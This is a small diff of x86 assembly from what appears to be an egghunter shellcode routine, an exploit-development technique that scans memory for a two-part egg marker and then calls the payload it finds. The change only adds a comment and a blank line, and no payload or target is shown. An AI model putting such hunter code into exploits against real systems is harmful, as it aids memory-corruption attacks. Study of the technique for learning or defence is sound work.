@@ -35,12 +35,13 @@ continue:
 
 	; Searching for the Egg marker
 next:
-	inc eax		; Searching forward
+	inc eax		; Searching forward  (can also try dec eax)
 isEgg:
 	cmp dword [eax-8], egg1		; Checking if we can see egg1
 	jne next			; If not, continuing to search
 	cmp dword [eax-4], egg2
 	jne next
+
 	call eax			; Once found, we call our payload
 
 huntersEnd:
